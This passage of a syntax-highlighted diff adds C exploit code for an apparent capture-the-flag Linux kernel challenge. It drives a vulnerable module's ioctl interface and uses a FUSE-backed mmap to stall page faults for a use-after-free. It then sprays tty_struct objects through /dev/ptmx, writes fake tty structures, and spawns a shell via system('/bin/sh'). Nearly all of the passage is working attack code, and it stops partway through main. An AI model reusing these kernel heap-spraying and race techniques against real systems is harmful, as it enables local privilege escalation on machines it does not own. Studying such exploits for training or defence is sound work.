+</span><span style="color:#c0c5ce;">        </span><span style="color:#96b5b4;">exit</span><span style="color:#c0c5ce;">(-</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">);
+</span><span style="color:#c0c5ce;">    }
+</span><span style="color:#c0c5ce;">    </span><span style="color:#96b5b4;">puts</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">[*] spawning shell</span><span style="color:#c0c5ce;">&quot;);
+</span><span style="color:#c0c5ce;">    </span><span style="color:#96b5b4;">system</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">/bin/sh</span><span style="color:#c0c5ce;">&quot;);
+</span><span style="color:#c0c5ce;">    </span><span style="color:#96b5b4;">exit</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">);
+</span><span style="color:#c0c5ce;">}
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#b48ead;">void </span><span style="color:#8fa1b3;">save_userland_state</span><span style="color:#c0c5ce;">() {
+</span><span style="color:#c0c5ce;">    </span><span style="color:#96b5b4;">puts</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">[*] saving user land state</span><span style="color:#c0c5ce;">&quot;);
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">__asm__</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">.intel_syntax noprefix;</span><span style="color:#c0c5ce;">&quot;
+</span><span style="color:#c0c5ce;">            &quot;</span><span style="color:#a3be8c;">mov user_cs, cs;</span><span style="color:#c0c5ce;">&quot;
+</span><span style="color:#c0c5ce;">            &quot;</span><span style="color:#a3be8c;">mov user_ss, ss;</span><span style="color:#c0c5ce;">&quot;
+</span><span style="color:#c0c5ce;">            &quot;</span><span style="color:#a3be8c;">mov user_sp, rsp;</span><span style="color:#c0c5ce;">&quot;
+</span><span style="color:#c0c5ce;">            &quot;</span><span style="color:#a3be8c;">pushf;</span><span style="color:#c0c5ce;">&quot;
+</span><span style="color:#c0c5ce;">            &quot;</span><span style="color:#a3be8c;">pop user_rflags;</span><span style="color:#c0c5ce;">&quot;
+</span><span style="color:#c0c5ce;">            &quot;</span><span style="color:#a3be8c;">.att_syntax</span><span style="color:#c0c5ce;">&quot;);
+</span><span style="color:#c0c5ce;">}
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#b48ead;">int</span><span style="color:#c0c5ce;"> ptmx[SPRAY_NUM];
+</span><span style="color:#c0c5ce;">cpu_set_t pwn_cpu;
+</span><span style="color:#b48ead;">int</span><span style="color:#c0c5ce;"> victim;
+</span><span style="color:#b48ead;">int</span><span style="color:#c0c5ce;"> fd;
+</span><span style="color:#b48ead;">char </span><span style="color:#c0c5ce;">*buf;
+</span><span style="color:#b48ead;">unsigned long</span><span style="color:#c0c5ce;"> kbase, kheap;
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#b48ead;">int </span><span style="color:#8fa1b3;">add</span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">char </span><span style="color:#c0c5ce;">*</span><span style="color:#bf616a;">data</span><span style="color:#c0c5ce;">, size_t </span><span style="color:#bf616a;">size</span><span style="color:#c0c5ce;">) {
+</span><span style="color:#c0c5ce;">    request_t req = {.</span><span style="color:#bf616a;">size </span><span style="color:#c0c5ce;">= size, .</span><span style="color:#bf616a;">data </span><span style="color:#c0c5ce;">= data};
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">int</span><span style="color:#c0c5ce;"> r = </span><span style="color:#8fa1b3;">ioctl</span><span style="color:#c0c5ce;">(fd, CMD_ADD, &amp;req);
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(r == -</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">)
+</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">fatal</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">blob_add</span><span style="color:#c0c5ce;">&quot;);
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">return</span><span style="color:#c0c5ce;"> r;
+</span><span style="color:#c0c5ce;">}
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#b48ead;">int </span><span style="color:#8fa1b3;">del</span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">int </span><span style="color:#bf616a;">id</span><span style="color:#c0c5ce;">) {
+</span><span style="color:#c0c5ce;">    request_t req = {.</span><span style="color:#bf616a;">id </span><span style="color:#c0c5ce;">= id};
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">int</span><span style="color:#c0c5ce;"> r = </span><span style="color:#8fa1b3;">ioctl</span><span style="color:#c0c5ce;">(fd, CMD_DEL, &amp;req);
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(r == -</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">)
+</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">fatal</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">blob_del</span><span style="color:#c0c5ce;">&quot;);
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">return</span><span style="color:#c0c5ce;"> r;
+</span><span style="color:#c0c5ce;">}
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#b48ead;">int </span><span style="color:#8fa1b3;">get</span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">int </span><span style="color:#bf616a;">id</span><span style="color:#c0c5ce;">, </span><span style="color:#b48ead;">char </span><span style="color:#c0c5ce;">*</span><span style="color:#bf616a;">data</span><span style="color:#c0c5ce;">, size_t </span><span style="color:#bf616a;">size</span><span style="color:#c0c5ce;">) {
+</span><span style="color:#c0c5ce;">    request_t req = {.</span><span style="color:#bf616a;">id </span><span style="color:#c0c5ce;">= id, .</span><span style="color:#bf616a;">size </span><span style="color:#c0c5ce;">= size, .</span><span style="color:#bf616a;">data </span><span style="color:#c0c5ce;">= data};
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">int</span><span style="color:#c0c5ce;"> r = </span><span style="color:#8fa1b3;">ioctl</span><span style="color:#c0c5ce;">(fd, CMD_GET, &amp;req);
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(r == -</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">)
+</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">fatal</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">blob_get</span><span style="color:#c0c5ce;">&quot;);
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">return</span><span style="color:#c0c5ce;"> r;
+</span><span style="color:#c0c5ce;">}
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#b48ead;">int </span><span style="color:#8fa1b3;">set</span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">int </span><span style="color:#bf616a;">id</span><span style="color:#c0c5ce;">, </span><span style="color:#b48ead;">char </span><span style="color:#c0c5ce;">*</span><span style="color:#bf616a;">data</span><span style="color:#c0c5ce;">, size_t </span><span style="color:#bf616a;">size</span><span style="color:#c0c5ce;">) {
+</span><span style="color:#c0c5ce;">    request_t req = {.</span><span style="color:#bf616a;">id </span><span style="color:#c0c5ce;">= id, .</span><span style="color:#bf616a;">size </span><span style="color:#c0c5ce;">= size, .</span><span style="color:#bf616a;">data </span><span style="color:#c0c5ce;">= data};
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">int</span><span style="color:#c0c5ce;"> r = </span><span style="color:#8fa1b3;">ioctl</span><span style="color:#c0c5ce;">(fd, CMD_SET, &amp;req);
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(r == -</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">)
+</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">fatal</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">blob_set</span><span style="color:#c0c5ce;">&quot;);
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">return</span><span style="color:#c0c5ce;"> r;
+</span><span style="color:#c0c5ce;">}
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#b48ead;">static int </span><span style="color:#8fa1b3;">getattr_callback</span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">const char </span><span style="color:#c0c5ce;">*</span><span style="color:#bf616a;">path</span><span style="color:#c0c5ce;">, </span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> stat *</span><span style="color:#bf616a;">stbuf</span><span style="color:#c0c5ce;">) {
+</span><span style="color:#c0c5ce;">    </span><span style="color:#96b5b4;">puts</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">[t][+] getattr_callback</span><span style="color:#c0c5ce;">&quot;);
+</span><span style="color:#c0c5ce;">    </span><span style="color:#96b5b4;">memset</span><span style="color:#c0c5ce;">(stbuf, </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">, sizeof(</span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> stat));
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(</span><span style="color:#96b5b4;">strcmp</span><span style="color:#c0c5ce;">(path, &quot;</span><span style="color:#a3be8c;">/pwn</span><span style="color:#c0c5ce;">&quot;) == </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">) {
+</span><span style="color:#c0c5ce;">        stbuf-&gt;st_mode = S_IFREG | </span><span style="color:#d08770;">0777</span><span style="color:#c0c5ce;">;
+</span><span style="color:#c0c5ce;">        stbuf-&gt;st_nlink = </span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">;
+</span><span style="color:#c0c5ce;">        stbuf-&gt;st_size = </span><span style="color:#d08770;">0x1000</span><span style="color:#c0c5ce;">;
+</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">return </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">;
+</span><span style="color:#c0c5ce;">    }
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">return </span><span style="color:#c0c5ce;">-ENOENT;
+</span><span style="color:#c0c5ce;">}
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#b48ead;">static int </span><span style="color:#8fa1b3;">open_callback</span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">const char </span><span style="color:#c0c5ce;">*</span><span style="color:#bf616a;">path</span><span style="color:#c0c5ce;">, </span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> fuse_file_info *</span><span style="color:#bf616a;">fi</span><span style="color:#c0c5ce;">) {
+</span><span style="color:#c0c5ce;">    </span><span style="color:#96b5b4;">puts</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">[t][+] open_callback</span><span style="color:#c0c5ce;">&quot;);
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">return </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">;
+</span><span style="color:#c0c5ce;">}
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#b48ead;">static int </span><span style="color:#8fa1b3;">read_callback</span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">const char </span><span style="color:#c0c5ce;">*</span><span style="color:#bf616a;">path</span><span style="color:#c0c5ce;">, </span><span style="color:#b48ead;">char </span><span style="color:#c0c5ce;">*</span><span style="color:#bf616a;">file_buf</span><span style="color:#c0c5ce;">, size_t </span><span style="color:#bf616a;">size</span><span style="color:#c0c5ce;">, off_t </span><span style="color:#bf616a;">offset</span><span style="color:#c0c5ce;">, </span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> fuse_file_info *</span><span style="color:#bf616a;">fi</span><span style="color:#c0c5ce;">) {
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">static int</span><span style="color:#c0c5ce;"> fault_cnt = </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">;
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">    </span><span style="color:#96b5b4;">puts</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">[t][+] read_callback</span><span style="color:#c0c5ce;">&quot;);
+</span><span style="color:#c0c5ce;">    </span><span style="color:#96b5b4;">printf</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#96b5b4;">\t</span><span style="color:#a3be8c;">path: </span><span style="color:#d08770;">%s</span><span style="color:#96b5b4;">\n</span><span style="color:#c0c5ce;">&quot;, path);
+</span><span style="color:#c0c5ce;">    </span><span style="color:#96b5b4;">printf</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#96b5b4;">\t</span><span style="color:#a3be8c;">size: 0x</span><span style="color:#d08770;">%lx</span><span style="color:#96b5b4;">\n</span><span style="color:#c0c5ce;">&quot;, size);
+</span><span style="color:#c0c5ce;">    </span><span style="color:#96b5b4;">printf</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#96b5b4;">\t</span><span style="color:#a3be8c;">offset: 0x</span><span style="color:#d08770;">%lx</span><span style="color:#96b5b4;">\n</span><span style="color:#c0c5ce;">&quot;, offset);
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(</span><span style="color:#96b5b4;">strcmp</span><span style="color:#c0c5ce;">(path, &quot;</span><span style="color:#a3be8c;">/pwn</span><span style="color:#c0c5ce;">&quot;) == </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">) {
+</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">switch </span><span style="color:#c0c5ce;">(fault_cnt++) {
+</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">case </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">:
+</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">case </span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">:
+</span><span style="color:#c0c5ce;">            </span><span style="color:#96b5b4;">puts</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">[t][*] UAF read</span><span style="color:#c0c5ce;">&quot;);
+</span><span style="color:#c0c5ce;">            </span><span style="color:#8fa1b3;">del</span><span style="color:#c0c5ce;">(victim);
+</span><span style="color:#c0c5ce;">            </span><span style="color:#96b5b4;">printf</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">[t][*] spraying </span><span style="color:#d08770;">%d</span><span style="color:#a3be8c;"> tty_struct objects</span><span style="color:#96b5b4;">\n</span><span style="color:#c0c5ce;">&quot;, SPRAY_NUM);
+</span><span style="color:#c0c5ce;">            </span><span style="color:#b48ead;">for </span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">int</span><span style="color:#c0c5ce;"> i = </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">; i &lt; SPRAY_NUM; i++) {
+</span><span style="color:#c0c5ce;">                ptmx[i] = </span><span style="color:#8fa1b3;">open</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">/dev/ptmx</span><span style="color:#c0c5ce;">&quot;, O_RDONLY | O_NOCTTY);
+</span><span style="color:#c0c5ce;">                </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(ptmx[i] == -</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">)
+</span><span style="color:#c0c5ce;">                    </span><span style="color:#8fa1b3;">fatal</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">/dev/ptmx</span><span style="color:#c0c5ce;">&quot;);
+</span><span style="color:#c0c5ce;">            }
+</span><span style="color:#c0c5ce;">            </span><span style="color:#b48ead;">return</span><span style="color:#c0c5ce;"> size;
+</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">case </span><span style="color:#d08770;">2</span><span style="color:#c0c5ce;">:
+</span><span style="color:#c0c5ce;">            </span><span style="color:#96b5b4;">puts</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">[t][*] UAF write</span><span style="color:#c0c5ce;">&quot;);
+</span><span style="color:#c0c5ce;">            </span><span style="color:#96b5b4;">printf</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">[t][*] spraying </span><span style="color:#d08770;">%d</span><span style="color:#a3be8c;"> fake tty_struct objects (blob)</span><span style="color:#96b5b4;">\n</span><span style="color:#c0c5ce;">&quot;, </span><span style="color:#d08770;">0x100</span><span style="color:#c0c5ce;">);
+</span><span style="color:#c0c5ce;">            </span><span style="color:#b48ead;">for </span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">int</span><span style="color:#c0c5ce;"> i = </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">; i &lt; </span><span style="color:#d08770;">0x100</span><span style="color:#c0c5ce;">; i++)
+</span><span style="color:#c0c5ce;">                </span><span style="color:#8fa1b3;">add</span><span style="color:#c0c5ce;">(buf, </span><span style="color:#d08770;">0x400</span><span style="color:#c0c5ce;">);
+</span><span style="color:#c0c5ce;">            </span><span style="color:#8fa1b3;">del</span><span style="color:#c0c5ce;">(victim);
+</span><span style="color:#c0c5ce;">            </span><span style="color:#96b5b4;">printf</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">[t][*] spraying </span><span style="color:#d08770;">%d</span><span style="color:#a3be8c;"> tty_struct objects</span><span style="color:#96b5b4;">\n</span><span style="color:#c0c5ce;">&quot;, SPRAY_NUM);
+</span><span style="color:#c0c5ce;">            </span><span style="color:#b48ead;">for </span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">int</span><span style="color:#c0c5ce;"> i = </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">; i &lt; SPRAY_NUM; i++) {
+</span><span style="color:#c0c5ce;">                ptmx[i] = </span><span style="color:#8fa1b3;">open</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">/dev/ptmx</span><span style="color:#c0c5ce;">&quot;, O_RDONLY | O_NOCTTY);
+</span><span style="color:#c0c5ce;">                </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(ptmx[i] == -</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">)
+</span><span style="color:#c0c5ce;">                    </span><span style="color:#8fa1b3;">fatal</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">/dev/ptmx</span><span style="color:#c0c5ce;">&quot;);
+</span><span style="color:#c0c5ce;">            }
+</span><span style="color:#c0c5ce;">            </span><span style="color:#96b5b4;">memcpy</span><span style="color:#c0c5ce;">(file_buf, buf, </span><span style="color:#d08770;">0x400</span><span style="color:#c0c5ce;">);
+</span><span style="color:#c0c5ce;">            </span><span style="color:#b48ead;">return</span><span style="color:#c0c5ce;"> size;
+</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">default</span><span style="color:#c0c5ce;">:
+</span><span style="color:#c0c5ce;">            </span><span style="color:#8fa1b3;">fatal</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">[t][-] unexpected page fault</span><span style="color:#c0c5ce;">&quot;);
+</span><span style="color:#c0c5ce;">        }
+</span><span style="color:#c0c5ce;">    }
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">return </span><span style="color:#c0c5ce;">-ENOENT;
+</span><span style="color:#c0c5ce;">}
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#b48ead;">static struct</span><span style="color:#c0c5ce;"> fuse_operations fops = {
+</span><span style="color:#c0c5ce;">    .</span><span style="color:#bf616a;">getattr </span><span style="color:#c0c5ce;">= getattr_callback,
+</span><span style="color:#c0c5ce;">    .</span><span style="color:#bf616a;">open </span><span style="color:#c0c5ce;">= open_callback,
+</span><span style="color:#c0c5ce;">    .</span><span style="color:#bf616a;">read </span><span style="color:#c0c5ce;">= read_callback,
+</span><span style="color:#c0c5ce;">};
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#b48ead;">int</span><span style="color:#c0c5ce;"> setup_done = </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">;
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#b48ead;">static void </span><span style="color:#c0c5ce;">*</span><span style="color:#8fa1b3;">fuse_thread</span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">void </span><span style="color:#c0c5ce;">*</span><span style="color:#bf616a;">arg</span><span style="color:#c0c5ce;">) {
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> fuse_args args = </span><span style="color:#8fa1b3;">FUSE_ARGS_INIT</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">NULL</span><span style="color:#c0c5ce;">);
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> fuse_chan *chan;
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> fuse *fuse;
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">    </span><span style="color:#96b5b4;">puts</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">[t][*] setting up FUSE</span><span style="color:#c0c5ce;">&quot;);
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(</span><span style="color:#8fa1b3;">mkdir</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">/tmp/test</span><span style="color:#c0c5ce;">&quot;, </span><span style="color:#d08770;">0777</span><span style="color:#c0c5ce;">))
+</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">fatal</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">mkdir(</span><span style="color:#96b5b4;">\&quot;</span><span style="color:#a3be8c;">/tmp/test</span><span style="color:#96b5b4;">\&quot;</span><span style="color:#a3be8c;">)</span><span style="color:#c0c5ce;">&quot;);
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(!(chan = </span><span style="color:#8fa1b3;">fuse_mount</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">/tmp/test</span><span style="color:#c0c5ce;">&quot;, &amp;args)))
+</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">fatal</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">fuse_mount</span><span style="color:#c0c5ce;">&quot;);
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(!(fuse = </span><span style="color:#8fa1b3;">fuse_new</span><span style="color:#c0c5ce;">(chan, &amp;args, &amp;fops, sizeof(fops), </span><span style="color:#d08770;">NULL</span><span style="color:#c0c5ce;">))) {
+</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">fuse_unmount</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">/tmp/test</span><span style="color:#c0c5ce;">&quot;, chan);
+</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">fatal</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">fuse_new</span><span style="color:#c0c5ce;">&quot;);
+</span><span style="color:#c0c5ce;">    }
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">    </span><span style="color:#96b5b4;">puts</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">[t][*] set cpu affinity</span><span style="color:#c0c5ce;">&quot;);
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(</span><span style="color:#8fa1b3;">sched_setaffinity</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">, sizeof(cpu_set_t), &amp;pwn_cpu))
+</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">fatal</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">sched_setaffinity</span><span style="color:#c0c5ce;">&quot;);
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">    </span><span style="color:#8fa1b3;">fuse_set_signal_handlers</span><span style="color:#c0c5ce;">(</span><span style="color:#8fa1b3;">fuse_get_session</span><span style="color:#c0c5ce;">(fuse));
+</span><span style="color:#c0c5ce;">    setup_done = </span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">;
+</span><span style="color:#c0c5ce;">    </span><span style="color:#96b5b4;">puts</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">[t][*] waiting for page fault</span><span style="color:#c0c5ce;">&quot;);
+</span><span style="color:#c0c5ce;">    </span><span style="color:#8fa1b3;">fuse_loop_mt</span><span style="color:#c0c5ce;">(fuse);
+</span><span style="color:#c0c5ce;">    </span><span style="color:#8fa1b3;">fuse_unmount</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">/tmp/test</span><span style="color:#c0c5ce;">&quot;, chan);
+</span><span style="color:#c0c5ce;">}
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#b48ead;">int</span><span style="color:#c0c5ce;"> pwn_fd = -</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">;
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#b48ead;">void </span><span style="color:#c0c5ce;">*</span><span style="color:#8fa1b3;">mmap_fuse_file</span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">void</span><span style="color:#c0c5ce;">) {
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(pwn_fd != -</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">) {
+</span><span style="color:#c0c5ce;">        </span><span style="color:#96b5b4;">puts</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">[*] closing /tmp/test/pwn to reopen it</span><span style="color:#c0c5ce;">&quot;);
+</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">close</span><span style="color:#c0c5ce;">(pwn_fd);
+</span><span style="color:#c0c5ce;">    }
+</span><span style="color:#c0c5ce;">    pwn_fd = </span><span style="color:#8fa1b3;">open</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">/tmp/test/pwn</span><span style="color:#c0c5ce;">&quot;, O_RDWR);
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(pwn_fd == -</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">)
+</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">fatal</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">/tmp/test/pwn</span><span style="color:#c0c5ce;">&quot;);
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">void </span><span style="color:#c0c5ce;">*page;
+</span><span style="color:#c0c5ce;">    page = </span><span style="color:#8fa1b3;">mmap</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">NULL</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x1000</span><span style="color:#c0c5ce;">, PROT_READ | PROT_WRITE, MAP_PRIVATE, pwn_fd, </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">);
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(page == MAP_FAILED)
+</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">fatal</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">mmap</span><span style="color:#c0c5ce;">&quot;);
+</span><span style="color:#c0c5ce;">    </span><span style="color:#96b5b4;">printf</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">[+] mmap /tmp/test/pwn at 0x</span><span style="color:#d08770;">%llx</span><span style="color:#96b5b4;">\n</span><span style="color:#c0c5ce;">&quot;, (</span><span style="color:#b48ead;">long long unsigned int</span><span style="color:#c0c5ce;">)page);
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">return</span><span style="color:#c0c5ce;"> page;
+</span><span style="color:#c0c5ce;">}
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#b48ead;">int </span><span style="color:#8fa1b3;">main</span><span style="color:#c0c5ce;">() {
+</span><span style="color:#c0c5ce;">    </span><span style="color:#8fa1b3;">save_userland_state</span><span style="color:#c0c5ce;">();
+</span><span style="color:#c0c5ce;">    </span><span style="color:#96b5b4;">puts</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">[*] set cpu affinity</span><span style="color:#c0c5ce;">&quot;);
+</span><span style="color:#c0c5ce;">    </span><span style="color:#8fa1b3;">CPU_ZERO</span><span style="color:#c0c5ce;">(&amp;pwn_cpu);
+</span><span style="color:#c0c5ce;">    </span><span style="color:#8fa1b3;">CPU_SET</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">, &amp;pwn_cpu);
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(</span><span style="color:#8fa1b3;">sched_setaffinity</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">, sizeof(cpu_set_t), &amp;pwn_cpu))
+</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">fatal</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">sched_setaffinity</span><span style="color:#c0c5ce;">&quot;);
+</span><span style="color:#c0c5ce;">
